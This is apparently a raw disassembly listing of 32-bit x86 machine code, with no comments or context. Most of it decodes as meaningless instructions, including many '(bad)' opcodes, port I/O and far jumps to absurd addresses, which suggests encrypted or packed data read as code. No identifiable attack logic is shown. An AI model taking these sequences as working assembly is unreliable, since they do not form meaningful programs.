  40897c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40897d:	mov    dh,0x21
  40897f:	imul   edx,DWORD PTR [eax-0x37],0x9d8afee3
  408986:	into   
  408987:	pop    ebx
  408988:	jle    0x40893e
  40898a:	inc    ebx
  40898b:	pop    esp
  40898c:	outs   dx,BYTE PTR ds:[esi]
  40898d:	inc    ecx
  40898e:	push   esi
  40898f:	gs or  bl,0x98
  408993:	aas    
  408994:	and    DWORD PTR [esi+0x78],ebx
  408997:	sub    bl,bh
  408999:	jnp    0x408a0d
  40899b:	fcomi  st,st(6)
  40899d:	xchg   edx,eax
  40899f:	jecxz  0x4089ea
  4089a1:	into   
  4089a2:	sbb    bh,BYTE PTR [eax+0x10]
  4089a5:	out    dx,al
  4089a6:	in     al,0xcd
  4089a8:	sbb    al,BYTE PTR [eax-0x7c]
  4089ab:	fbstp  TBYTE PTR [ecx-0x1f]
  4089ae:	(bad)  
  4089af:	fs dec ebp
  4089b1:	xchg   ebp,eax
  4089b2:	add    eax,0xe12c60ba
  4089b7:	pop    ds
  4089b8:	sub    BYTE PTR [edx+edi*8],0xa2
  4089bc:	(bad)  
  4089bd:	in     eax,dx
  4089be:	pop    ebx
  4089bf:	and    al,0x5b
  4089c1:	cmp    cl,BYTE PTR [edi-0x2f900849]
  4089c7:	mov    ds:0xf49baf64,eax
  4089cc:	sub    ebx,DWORD PTR [ecx+0x5f]
  4089cf:	push   cs
  4089d0:	outs   dx,DWORD PTR ds:[esi]
  4089d1:	sub    ah,BYTE PTR [ebx-0x52]
  4089d4:	in     al,0x8d
  4089d6:	sbb    esp,DWORD PTR [eax]
  4089d8:	(bad)  
  4089d9:	mov    ds:0x3b302771,eax
  4089de:	jnp    0x408987
  4089e0:	mov    dl,0x39
  4089e2:	pushf  
  4089e3:	mov    ah,0xcf
  4089e5:	fstp   QWORD PTR [ebp+0x7e667e69]
  4089eb:	inc    edx
  4089ec:	fistp  QWORD PTR [edi-0x548c7001]
  4089f2:	aad    0x21
  4089f4:	push   0xffffffc0
  4089f6:	and    BYTE PTR [eax+0x24],0x31
  4089fa:	hlt    
  4089fb:	push   edx
  4089fc:	jne    0x408a1a
  4089fe:	xchg   DWORD PTR [ecx],edx
  408a00:	pop    ecx
  408a01:	pop    esp
  408a02:	xor    eax,DWORD PTR [ecx-0x6015acb6]
  408a08:	ss int 0x2c
  408a0b:	bound  edx,QWORD PTR fs:[esi+0x7f21f983]
  408a12:	lea    esi,[eax]
  408a14:	pop    ebx
  408a15:	icebp  
  408a16:	or     al,BYTE PTR [edx+0x7e]
  408a19:	mov    al,0x72
  408a1b:	sbb    DWORD PTR [ebx-0x3ed01cfd],esp
  408a21:	loope  0x408a12
  408a23:	popa   
  408a24:	inc    esi
  408a25:	fwait
  408a26:	jecxz  0x4089a8
  408a28:	push   edx
  408a29:	xchg   esi,eax
  408a2a:	stos   BYTE PTR es:[edi],al
  408a2b:	jmp    0xd694:0xf4bf10fd
  408a32:	(bad)  
  408a33:	sbb    eax,0x3addd7a9
  408a38:	push   esi
  408a39:	sub    bl,dh
  408a3b:	pop    edx
  408a3c:	in     al,dx
  408a3d:	sub    ebx,ebx
  408a3f:	mov    bh,0x5f
  408a41:	jo     0x408a56
  408a43:	and    eax,0x847c9c8a
  408a48:	lds    ax,DWORD PTR [edx]
  408a4b:	push   edx
  408a4c:	es ss xchg esp,eax
  408a4f:	hlt    
  408a50:	mov    al,0xfd
  408a52:	xor    eax,0xea4aa0a4
  408a57:	sub    edi,DWORD PTR [ebp-0x5c38e6ad]
  408a5d:	inc    edi
  408a5e:	jns    0x408aac
  408a60:	push   edx
  408a61:	push   edx
  408a62:	jecxz  0x408a82
  408a64:	jns    0x408acd
  408a66:	call   0xe6c9:0x50b5126a
  408a6d:	mov    esp,0x35a90946
  408a72:	into   
  408a73:	in     eax,dx
  408a74:	idiv   BYTE PTR [ebx+0x10]
  408a77:	mov    eax,0x1584a4f4
  408a7c:	test   eax,0x579f7754
  408a81:	aaa    
  408a82:	(bad)  
  408a83:	in     eax,dx
  408a84:	and    al,0x2e
  408a86:	inc    edx
  408a87:	add    DWORD PTR [ebx+0x6878f77f],0x8f4300c4
  408a91:	data16 out dx,al
  408a93:	or     dh,ch
  408a95:	push   cs
  408a96:	arpl   si,si
  408a98:	dec    ebx
  408a99:	mov    ah,ah
  408a9b:	scas   eax,DWORD PTR es:[edi]
  408a9c:	js     0x408a3a
  408a9e:	sbb    edi,0xffffffee
  408aa1:	mov    dh,0x41
  408aa3:	mov    bl,0x60
  408aa5:	scas   al,BYTE PTR es:[edi]
  408aa6:	fsubr  QWORD PTR [edx-0x29]
  408aa9:	jg     0x408a8d
  408aab:	out    0xe3,al
  408aad:	mov    dh,BYTE PTR [eax]
  408aaf:	jp     0x408a83
  408ab1:	xchg   edi,eax
  408ab2:	into   
  408ab3:	sub    DWORD PTR [ebx],0xa66fe75b
  408ab9:	clc    
  408aba:	test   al,0x8f
  408abc:	cmc    
  408abd:	inc    edi
  408abe:	mov    ds:0xcb0ac2ee,eax
  408ac3:	inc    esi
  408ac4:	out    0x40,eax
  408ac6:	sub    ecx,eax
  408ac8:	pop    esi
  408ac9:	dec    ebp
  408aca:	leave  
  408acb:	pop    ss
  408acc:	scas   eax,DWORD PTR es:[edi]
  408acd:	out    0x19,eax
  408acf:	xor    BYTE PTR [ecx],dl
  408ad1:	(bad)  
  408ad2:	je     0x408ae7
  408ad4:	dec    esi
  408ad5:	std    
  408ad6:	retf   
  408ad7:	out    0x98,al
  408ad9:	cli    
  408ada:	push   0x6c
  408adc:	hlt    
  408add:	dec    ebp
  408ade:	adc    DWORD PTR [ebx-0x7e],ebp
  408ae1:	cld    
  408ae2:	push   0x17
  408ae4:	rol    DWORD PTR [ebx],1
  408ae6:	pop    esi
  408ae7:	push   esp
  408ae8:	mov    esp,0x98421ee5
  408aed:	inc    ecx
  408aee:	mov    dl,0x33
  408af0:	ins    DWORD PTR es:[edi],dx
  408af1:	out    dx,eax
  408af2:	and    al,0x72
  408af4:	lahf   
  408af5:	dec    esp
  408af6:	and    BYTE PTR [eax],al
  408af8:	cmp    DWORD PTR [esi],ebx
  408afa:	out    dx,al
  408afb:	add    BYTE PTR [ecx],bh
  408afd:	imul   edx,DWORD PTR [edi+0x1aef4717],0xffffffcb
  408b04:	sub    al,0x8c
  408b06:	and    al,0xc1
  408b08:	xchg   ebx,eax
  408b09:	je     0x408b74
  408b0b:	repz xor BYTE PTR [eax],0x76
  408b0f:	xchg   DWORD PTR [edi+0x5],ecx
  408b12:	push   ebx
  408b13:	mov    al,0x9d
  408b15:	(bad)  
  408b16:	scas   eax,DWORD PTR es:[edi]
  408b17:	jmp    0x408ab1
  408b19:	call   0x155f1454
  408b1e:	popf   
  408b1f:	xor    eax,0xffffffda
  408b22:	ins    DWORD PTR es:[edi],dx
  408b23:	ins    DWORD PTR es:[edi],dx
  408b24:	(bad)  
  408b25:	sbb    BYTE PTR [ebp+0x1c],dh
  408b28:	sbb    eax,0x254e4313
  408b2d:	pop    edx
  408b2e:	mov    esp,0x97263959
  408b33:	add    ecx,DWORD PTR [esi-0x48]
  408b36:	mov    eax,0x4524c36a
  408b3b:	fdivr  DWORD PTR [esi+0x41]
  408b3e:	mov    ebx,0xa3bb125
  408b43:	in     eax,dx
  408b44:	aad    0x60
  408b46:	mov    edi,DWORD PTR [ecx+0x31340ce]
  408b4c:	xor    DWORD PTR [edx+0x3f40e539],0x18e271ba
  408b56:	jae    0x408bbb
  408b58:	retf   
  408b59:	xchg   BYTE PTR [esi],cl
  408b5b:	(bad)  
  408b5c:	push   0xffffff9d
  408b5e:	dec    esi
  408b5f:	and    ebx,0xffffff8e
  408b62:	aas    
  408b63:	or     bl,BYTE PTR [esi]
  408b65:	ins    BYTE PTR es:[edi],dx
  408b66:	dec    esi
  408b67:	add    ah,bh
  408b69:	add    al,0x3a
  408b6b:	sti    
  408b6c:	retf   
  408b6d:	sub    cl,cl
  408b6f:	out    dx,al
  408b70:	mov    esp,0x8040762d
  408b75:	xchg   ebx,eax
  408b76:	outs   dx,BYTE PTR ds:[esi]
  408b77:	or     eax,0xb652cd49
  408b7c:	mov    ds,WORD PTR [ebp-0x73]
  408b7f:	xchg   ebp,eax
  408b81:	outs   dx,BYTE PTR ds:[esi]
  408b82:	inc    eax
  408b83:	ins    DWORD PTR es:[edi],dx
  408b84:	mov    bl,al
  408b86:	test   BYTE PTR [eax+0x11db630],cl
  408b8c:	lahf   
  408b8d:	shrd   ebx,ebx,cl
  408b90:	cmp    cl,BYTE PTR [edi+edi*4]
  408b93:	inc    edi
  408b94:	aas    
  408b95:	mov    ds:0xe5d26a1,al
  408b9a:	hlt    
  408b9b:	adc    ebx,edx
  408b9d:	sub    BYTE PTR [ebx+0x7c],ah
  408ba0:	cld    
  408ba1:	xor    al,BYTE PTR [edx+0x76]
  408ba4:	or     BYTE PTR ds:0xb0e9ae,ah
  408baa:	(bad)  
  408bab:	pop    ss
  408bac:	add    eax,0xfbbd9aa1
  408bb1:	sbb    DWORD PTR [edx+0x2949baa6],ecx
  408bb7:	outs   dx,BYTE PTR ds:[esi]
  408bb8:	or     DWORD PTR [ebp+0x4aaae00f],edi
  408bbe:	sub    eax,0xbf521104
  408bc3:	jo     0x408bdd
  408bc5:	sar    DWORD PTR [ebp+0x482b5d77],0x4f
  408bcc:	in     al,0x50
  408bce:	mov    dl,0x27
  408bd0:	scas   al,BYTE PTR es:[edi]
  408bd1:	loopne 0x408c28
  408bd3:	mov    al,bl
  408bd5:	punpckhwd mm1,QWORD PTR [ebx+0xc353c2d]
  408bdc:	pop    edx
  408bdd:	pusha  
  408bde:	dec    edi
  408bdf:	jo     0x408c47
  408be1:	(bad)
  408be6:	scas   al,BYTE PTR es:[edi]
  408be7:	xchg   esp,eax
  408be8:	fisub  WORD PTR [ebx-0x1b3c1f96]
  408bee:	in     eax,dx
  408bef:	xchg   DWORD PTR ds:0xa4992d08,ebp
  408bf5:	push   0x3bfbbe11
  408bfa:	iret   
  408bfb:	mov    ecx,0xe564a263
  408c00:	jnp    0x408c10
  408c02:	push   0x5b56dab8
  408c07:	mov    ds:0x3ad9fc9e,eax
  408c0c:	stc    
  408c0d:	mov    ecx,0x424201ee
  408c12:	cs shr ebp,0x55
  408c16:	loope  0x408c2f
  408c18:	push   ds
  408c19:	popf   
  408c1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c1b:	les    esi,FWORD PTR [eax+0x8f3bcfd]
  408c21:	pusha  
  408c22:	xor    eax,0x2104f25d
  408c27:	bound  ecx,QWORD PTR [esi]
  408c29:	fdiv   DWORD PTR [edi]
  408c2b:	ret    0x4d04
  408c2e:	icebp  
  408c2f:	popa   
  408c30:	adc    DWORD PTR [ecx+0x46],eax
  408c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c34:	and    esp,esi
  408c36:	dec    esi
  408c37:	dec    esp
  408c38:	xor    ah,ah
  408c3a:	mov    WORD PTR [eax],cs
  408c3c:	imul   ebp,DWORD PTR [edx],0xffffffa8
  408c3f:	jp     0x408cbe
  408c41:	or     bh,BYTE PTR [ebx+0x24]
  408c44:	mov    ecx,0x49592f6f
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  edi,QWORD PTR ds:0x472987e5
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c0e
  408c7d:	sbb    al,0x73
  408c7f:	(bad)  
  408c80:	in     eax,dx
  408c81:	stos   BYTE PTR es:[edi],al
  408c82:	outs   dx,BYTE PTR ds:[esi]
  408c83:	push   0x79
  408c85:	mov    al,0xf7
  408c87:	addr16 push edx
  408c89:	add    al,0x8
  408c8b:	cmp    al,0xfa
  408c8d:	cmp    DWORD PTR [eax+0x4a841381],ecx
  408c93:	les    eax,FWORD PTR [eax]
  408c95:	mov    eax,ds:0x6c0db721
  408c9a:	sub    eax,0x5edeef00
  408c9f:	cmp    al,0x71
  408ca1:	out    0x77,eax
  408ca3:	adc    ah,bh
  408ca5:	stc    
  408ca6:	shl    BYTE PTR [eax-0x2556772e],1
  408cac:	retf   0x79d7
  408caf:	xchg   BYTE PTR [ebp+0x7f07be21],bh
  408cb5:	xchg   edi,eax
  408cb6:	ins    DWORD PTR es:[edi],dx
  408cb7:	fwait
  408cb8:	cdq    
  408cb9:	or     BYTE PTR [ecx],ah
  408cbb:	in     eax,dx
  408cbc:	adc    al,al
  408cbe:	repnz stos DWORD PTR es:[edi],eax
  408cc0:	mov    eax,0xc2140d45
  408cc5:	inc    eax
  408cc6:	push   es
  408cc7:	pop    edx
  408cc8:	add    al,0x2
  408cca:	push   ecx
  408ccb:	outs   dx,BYTE PTR ds:[esi]
  408ccc:	or     BYTE PTR [edi+0x4f],bh
  408ccf:	bound  esi,QWORD PTR [ebp-0x61]
  408cd2:	jmp    0x408d50
  408cd4:	fstp   DWORD PTR [ecx+esi*2]
  408cd7:	call   0x496:0x89b1c867
  408cde:	push   edx
  408cdf:	in     al,0xa6
  408ce1:	fxch   st(6)
  408ce3:	data16 (bad) 
  408ce5:	cmp    DWORD PTR [ecx-0xc],esp
  408ce8:	dec    esi
  408ce9:	fcomp  QWORD PTR [ecx+ebp*4]
  408cec:	mov    dh,0x1c
  408cee:	mov    al,0x45
  408cf0:	lock and BYTE PTR es:[ecx-0x73889dda],dl
  408cf8:	pop    esi
  408cf9:	int3   
  408cfa:	sar    DWORD PTR [edi-0x31],cl
  408cfd:	lock sub BYTE PTR [edi+0x13d407c7],ah
  408d04:	push   ecx
  408d05:	lock xlat BYTE PTR ds:[ebx]
  408d07:	mov    ecx,DWORD PTR [ebp-0x7d]
  408d0a:	mov    ds:0x17e540ec,eax
  408d0f:	jge    0x408d8e
  408d11:	mov    edi,DWORD PTR [ecx-0x25fd19e5]
  408d17:	push   es
  408d18:	xor    bl,BYTE PTR [ecx+0x58cc01e8]
  408d1e:	xlat   BYTE PTR ds:[ebx]
  408d1f:	bound  ebx,QWORD PTR [esi-0xa]
  408d22:	mov    eax,ds:0x591e56a
  408d27:	std    
  408d28:	sub    bh,BYTE PTR [eax+0x76]
  408d2b:	xor    BYTE PTR [edi-0x6979e621],0x4e
  408d32:	xlat   BYTE PTR ds:[ebx]
  408d33:	stc    
  408d34:	icebp  
  408d35:	int3   
  408d36:	pop    ebp
  408d37:	test   eax,0xfb6c5269
  408d3c:	push   es
  408d3d:	push   ss
  408d3e:	mov    ebp,0x8e2101
  408d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d44:	in     eax,0xd0
  408d46:	mov    ecx,0xf995107a
  408d4b:	int    0xa8
  408d4d:	retf   
  408d4e:	jmp    0x408cef
  408d50:	adc    BYTE PTR [ebx+0x9ba7119],ch
  408d56:	ret    0x46ca
  408d59:	sahf   
  408d5a:	loop   0x408dc6
  408d5c:	std    
  408d5d:	popf   
  408d5e:	nop
  408d5f:	mov    eax,ds:0x2fa794e4
  408d64:	and    ecx,DWORD PTR [ebx]
  408d66:	sub    BYTE PTR [eax-0x110eb1cc],dl
  408d6c:	mov    WORD PTR [eax+eiz*1+0x33],fs
  408d70:	das    
  408d71:	cmp    DWORD PTR [edx-0x7e63856c],0xec4c7789
  408d7b:	arpl   dx,dx
  408d7d:	mov    bl,0xc7
  408d7f:	push   ebp
  408d80:	jecxz  0x408dcb
  408d82:	dec    eax
  408d83:	and    eax,0x87230953
  408d88:	call   DWORD PTR [esi-0x48a7f108]
  408d8e:	(bad)  
  408d8f:	test   al,0x1c
  408d91:	js     0x408d31
  408d93:	mov    ch,0xc7
  408d95:	sub    DWORD PTR [edx+esi*4-0x2397ff91],0xf3b68032
  408da0:	call   0x65d9cf35
  408da5:	jne    0x408de2
  408da7:	jne    0x67ab9c8
  408dad:	dec    edx
  408dae:	stc    
  408daf:	jo     0x408d5a
  408db1:	push   0xfffffff1
  408db3:	pop    ds
  408db4:	pop    esi
  408db5:	int    0x4
  408db7:	paddb  mm4,QWORD PTR [esi+0x34]
  408dbb:	inc    edx
  408dbc:	add    BYTE PTR [edx-0x26c37f13],0x1f
  408dc3:	(bad)  
  408dc4:	cs pop edx
  408dc6:	shl    dl,0x7c
  408dc9:	dec    edx
  408dca:	add    DWORD PTR [ebx-0x4095ac5f],eax
  408dd0:	xor    eax,esi
  408dd2:	and    edx,DWORD PTR [esi-0x3472be64]
  408dd8:	mov    ds:0x74ff3e65,eax
  408ddd:	pop    esp
  408dde:	jl     0x408e0c
  408de0:	add    DWORD PTR cs:[eax],ebp
  408de3:	int3   
  408de4:	mov    edi,0x3207f90a
  408de9:	cmp    DWORD PTR [eax+0x1ac9b766],ebp
  408def:	shr    DWORD PTR [edx-0x3ba8ee21],1
  408df5:	mov    WORD PTR [esi+0x17890e9b],ss
  408dfb:	pop    esi
  408dfc:	adc    DWORD PTR [edx],ebx
  408dfe:	in     al,0x14
  408e00:	fisub  DWORD PTR [ebp+0x79]
  408e03:	call   0x758e058d
  408e08:	out    dx,al
  408e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e0a:	xchg   DWORD PTR [edi+ebx*8-0x31],esp
  408e0e:	adc    BYTE PTR [esi+0x37a5fee3],cl
  408e14:	and    eax,0xc6667935
  408e19:	push   ebx
  408e1a:	scas   al,BYTE PTR es:[edi]
  408e1b:	mov    eax,0xc9dcab92
  408e20:	dec    eax
  408e21:	inc    edi
  408e22:	and    ebx,DWORD PTR [ebx+0xc]
  408e25:	mov    edi,0x2e601161
  408e2a:	ss retf 0x7b2f
  408e2e:	and    eax,0xe36a2ca2
  408e33:	fwait
  408e34:	sub    eax,0xa831ac1e
  408e39:	(bad)  
  408e3a:	xlat   BYTE PTR ds:[ebx]
  408e3b:	inc    ecx
  408e3c:	(bad)  
  408e3d:	push   edi
  408e3e:	mov    fs,ecx
  408e40:	jne    0x408e63
  408e42:	sub    al,0xd8
  408e44:	dec    ecx
  408e45:	outs   dx,BYTE PTR ds:[esi]
  408e46:	adc    al,0xd2
  408e48:	sub    ebx,edx
  408e4a:	xchg   BYTE PTR [ebp-0x69],al
  408e4d:	lea    ebp,[esi-0x22]
  408e50:	jmp    0x66ba9435
  408e55:	push   ecx
  408e56:	pop    esi
  408e57:	dec    edi
  408e58:	aam    0xc9
  408e5a:	popf   
  408e5b:	popf   
  408e5c:	sub    eax,DWORD PTR ss:[ebp+esi*2+0x9297905]
  408e64:	jge    0x408e4f
  408e66:	shl    cl,1
  408e68:	test   bl,bh
  408e6a:	mov    ds:0xe97b152d,eax
  408e6f:	retf   0x59a6
  408e72:	jne    0x408e46
  408e74:	add    eax,0x86a24ab8
  408e79:	(bad)  
  408e7a:	leave  
  408e7b:	adc    eax,0x5067c9c1
  408e80:	inc    ebp
  408e81:	in     eax,dx
  408e82:	mov    ch,0x2f
  408e84:	in     eax,dx
  408e85:	stos   BYTE PTR es:[edi],al
  408e86:	lock push ecx
  408e88:	add    edi,DWORD PTR [edx+0x2b]
  408e8b:	popf   
  408e8c:	mov    edx,0x54af5a09
  408e91:	jns    0x408e1d
  408e93:	push   esp
  408e94:	add    al,0xe1
  408e96:	sub    BYTE PTR ds:0x5406d175,dl
  408e9c:	fwait
  408e9d:	retf   
  408e9e:	fnstenv [edi-0x34]
  408ea1:	scas   eax,DWORD PTR es:[edi]
  408ea2:	xchg   ebp,eax
  408ea3:	popa   
  408ea4:	sbb    al,bl
  408ea6:	mov    esp,0x645861e9
  408eab:	ficomp DWORD PTR [ecx]
  408ead:	mov    bh,0xa8
  408eaf:	lock mov eax,ds:0xd33ae6b5
  408eb5:	int    0xbe
  408eb7:	cmc    
  408eb8:	sub    edi,DWORD PTR [eax]
  408eba:	or     ax,0x89da
  408ebe:	in     eax,0x24
  408ec0:	loopne 0x408ea1
  408ec2:	loope  0x408f31
  408ec4:	dec    esi
  408ec5:	addr16 mov edx,0xd5c918e9
  408ecb:	imul   ebp,DWORD PTR [esi+0x2917082f],0xffffffc8
  408ed2:	std    
  408ed3:	push   eax
  408ed4:	les    edx,FWORD PTR [ebx-0x52ae6bab]
  408eda:	mov    eax,0xe877c9cd
  408edf:	adc    bh,BYTE PTR [ecx+0x3073ea2c]
  408ee5:	rcl    DWORD PTR [esi],1
  408ee7:	push   0x54
  408ee9:	std    
  408eea:	jp     0x408e76
  408eec:	es mov eax,0x26d6de59
  408ef2:	push   edi
  408ef3:	and    DWORD PTR [edi],ecx
  408ef5:	pop    ss
  408ef6:	mov    dl,0xa6
  408ef8:	pop    ss
  408ef9:	fwait
  408efa:	sbb    eax,0xdce4bee5
  408eff:	popw   es
  408f01:	inc    eax
  408f02:	mov    cl,0x36
  408f04:	pop    ebp
  408f05:	xchg   ebp,eax
  408f06:	shl    esp,1
  408f08:	lock dec ecx
  408f0a:	pop    ecx
  408f0b:	mov    cs,WORD PTR [esp+ebx*1]
  408f0e:	jge    0x408ee6
  408f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f11:	mov    BYTE PTR [ebx-0x8e41fed],0xec
  408f18:	and    al,0xbc
  408f1a:	ret    0x66e4
  408f1d:	adc    ecx,DWORD PTR [ebp+0x20]
  408f20:	xchg   edi,eax
  408f21:	in     al,0xa
  408f23:	mov    al,0x33
  408f25:	and    DWORD PTR [ebx-0xf],ecx
  408f28:	mov    dh,dh
  408f2a:	sub    BYTE PTR [esi],dl
  408f2c:	bound  eax,QWORD PTR [edx+edi*4]
  408f2f:	jb     0x408f64
  408f31:	mov    ebp,0x2d28e99e
  408f36:	xchg   ebp,eax
  408f37:	push   esp
  408f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f39:	jle    0x408f70
  408f3b:	mov    ebp,cs
  408f3d:	sub    ebx,DWORD PTR [ebx+0x5]
  408f40:	inc    eax
  408f41:	add    esp,DWORD PTR [ecx+0x41c4b970]
  408f47:	imul   ebp,DWORD PTR [esi-0x5f1c5f1b],0xffffff94
  408f4e:	mov    ebx,0x3c9a3d9d
  408f53:	add    eax,0x98ba5a84
  408f58:	cdq    
  408f59:	push   esp
  408f5a:	or     BYTE PTR [edi+0x1bc057d3],bh
  408f60:	jb     0x408fc0
  408f62:	arpl   bp,si
  408f64:	push   cs
  408f65:	sub    al,0xf5
  408f67:	jae    0x408f62
  408f69:	add    DWORD PTR [eax],ebx
  408f6b:	xlat   BYTE PTR ds:[ebx]
  408f6c:	pop    ecx
  408f6d:	add    DWORD PTR [edi],edi
  408f6f:	jmp    0x408f41
  408f71:	cmp    bh,bh
  408f73:	cmp    ebx,DWORD PTR [edx+0x15]
  408f76:	es in  eax,0x7b
  408f79:	jne    0x408fe6
  408f7b:	or     edi,ebx
  408f7d:	mov    BYTE PTR [edi-0x3d],al
  408f80:	mov    eax,ds:0x46c6108b
  408f85:	dec    esp
  408f86:	mov    ds:0xf1c4c3b7,al
  408f8b:	or     eax,0xf1643bae
  408f90:	add    ax,0x9fa6
  408f94:	sti    
  408f95:	les    eax,FWORD PTR ds:0xbae83309
  408f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f9c:	scas   al,BYTE PTR es:[edi]
  408f9d:	mov    esi,0x3341a1e6
  408fa2:	ja     0x408f4b
  408fa4:	add    edi,DWORD PTR [ecx+0x4f11713]
  408faa:	cmp    BYTE PTR [eax],0xff
  408fad:	xor    BYTE PTR [ebp+0x41b02c05],cl
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xc51937f3
  408fc6:	shr    BYTE PTR [ebp+eax*4+0x77],0xe6
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f8e
  408fd2:	mov    edx,DWORD PTR [edi]
  408fd4:	ins    BYTE PTR es:[edi],dx
  408fd5:	jae    0x40904b
  408fd7:	mov    eax,0x7072df3
  408fdc:	cmp    BYTE PTR [edx],ah
  408fde:	pop    eax
  408fdf:	mov    dh,0x61
  408fe1:	cmp    al,0xbc
  408fe3:	arpl   WORD PTR [esi+0x46],di
  408fe6:	cwde   
  408fe7:	arpl   WORD PTR [ebx+0xe],di
  408fea:	ja     0x408fcc
  408fec:	jl     0x408fd7
  408fee:	in     al,0x1a
  408ff0:	adc    DWORD PTR [esi+ebx*2+0x37b27228],0x91a14ac0
  408ffb:	ret    0xbb01
  408ffe:	les    edx,FWORD PTR [edx+0x11b5644e]
  409004:	out    dx,al
  409005:	mov    edx,0xbf404a6b
  40900a:	push   esi
  40900b:	pop    esi
  40900c:	cwde   
  40900d:	or     bh,BYTE PTR fs:[eax+esi*4]
  409011:	cmp    eax,0xfa00e79c
  409016:	pop    esp
  409017:	hlt    
  409018:	adc    eax,0xa9a02854
  40901d:	retf   0x8ea3
  409020:	arpl   WORD PTR [ebx+0x40],bx
  409023:	adc    BYTE PTR [edi+0x767ac0d3],bl
  409029:	scas   al,BYTE PTR es:[edi]
  40902a:	bound  esi,QWORD PTR [ebx+0x4d55a08b]
  409030:	cld    
  409031:	(bad)  
  409033:	outs   dx,BYTE PTR ds:[esi]
  409034:	imul   edi,DWORD PTR [ebp+0x2920ef2],0xffffffda
  40903b:	mov    ah,0x8e
  40903d:	stos   DWORD PTR es:[edi],eax
  40903e:	fistp  QWORD PTR [edi]
  409040:	sbb    BYTE PTR ds:0x51e28b3c,ch
  409046:	mov    esi,0x2b28c0db
  40904b:	ss jmp 0x4090bb
  40904e:	gs pop ebp
  409050:	mov    al,ds:0x84d2e69a
  409055:	jl     0x40905a
  409057:	bound  eax,QWORD PTR [ecx+0x71765d90]
  40905d:	and    dl,0x9
  409060:	and    al,0xc1
  409062:	mov    edi,0xf2336c6e
  409067:	std    
  409068:	jecxz  0x40909b
  40906a:	inc    edx
  40906b:	xor    eax,DWORD PTR [edi]
  40906d:	inc    esp
  40906e:	arpl   cx,ax
  409070:	cmc    
  409071:	sbb    ch,ch
  409073:	push   eax
  409074:	mov    ch,0x32
  409076:	push   es
  409077:	sub    esp,eax
  409079:	sub    al,0x36
  40907b:	dec    eax
  40907c:	xor    eax,0x29db6d75
  409081:	sbb    esp,DWORD PTR [edx+ecx*8-0x6a]
  409085:	fnstsw WORD PTR ss:[edi-0x12]
  409089:	push   ss
  40908a:	mov    ebx,ecx
  40908c:	sbb    al,0x49
  40908e:	cwde   
  40908f:	xor    BYTE PTR [eax],bh
  409091:	mov    ss,edx
  409093:	rcl    BYTE PTR [edi+0x53434cea],1
  409099:	(bad)  
  40909a:	push   cs
  40909b:	dec    eax
  40909c:	fptan  
  40909e:	cld    
  40909f:	and    eax,0x70f479d6
  4090a4:	pop    edi
  4090a5:	adc    DWORD PTR [ebx+0x51],ebp
  4090a8:	test   BYTE PTR [ebx-0x6d],ah
  4090ab:	setle  BYTE PTR [eax+0x3b]
  4090af:	pop    esp
  4090b0:	js     0x409075
  4090b2:	div    dl
  4090b4:	ficomp DWORD PTR ds:0xe0d2f4c4
  4090ba:	inc    esi
  4090bb:	jle    0x409100
  4090bd:	xchg   ecx,eax
  4090be:	bound  ecx,QWORD PTR [eax-0x6ccc12ee]
  4090c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c5:	jnp    0x4090ae
  4090c7:	adc    BYTE PTR [eax-0x5dd15557],dh
  4090cd:	test   eax,0xf9bc8ae0
  4090d2:	mov    edx,0x8f010210
  4090d7:	cmp    cl,dh
  4090d9:	mov    dl,dh
  4090db:	mov    dl,0x7a
  4090dd:	retf   0x2863
  4090e0:	or     BYTE PTR [edi],dl
  4090e2:	clc    
  4090e3:	mov    dl,0x47
  4090e5:	dec    BYTE PTR [edi-0x69c2d84a]
  4090eb:	pop    edx
  4090ec:	sbb    al,0x1e
  4090ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ef:	inc    eax
  4090f0:	pop    edi
  4090f1:	outs   dx,BYTE PTR ds:[esi]
  4090f2:	pop    edi
  4090f3:	popa   
  4090f4:	jno    0x409093
  4090f6:	cmc    
  4090f7:	sbb    BYTE PTR [edi-0x3d493ca0],cl
  4090fd:	sbb    ebx,eax
  4090ff:	std    
  409100:	inc    ebx
  409101:	scas   eax,DWORD PTR es:[edi]
  409102:	(bad)  
  409103:	gs mov dl,bh
  409106:	inc    ebx
  409107:	sub    bh,dh
  409109:	mov    esp,0x870723fa
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	jle    0x409102
  409111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409112:	and    bl,al
  409114:	hlt    
  409115:	repz test al,0xbf
  409118:	fwait
  409119:	add    al,0xd0
  40911b:	dec    edi
  40911c:	arpl   WORD PTR [ebx],ax
  40911e:	cs push esi
  409120:	loopne 0x4090fc
  409122:	adc    al,0xfe
  409124:	pop    edx
  409125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409126:	iret   
  409127:	mov    DWORD PTR [esi+0x7e48f2e3],esp
  40912d:	mov    cl,0x80
  40912f:	jp     0x40913e
  409131:	mov    eax,ds:0xb7f1b8c3
  409136:	xor    al,0xee
  409138:	push   cs
  409139:	pop    eax
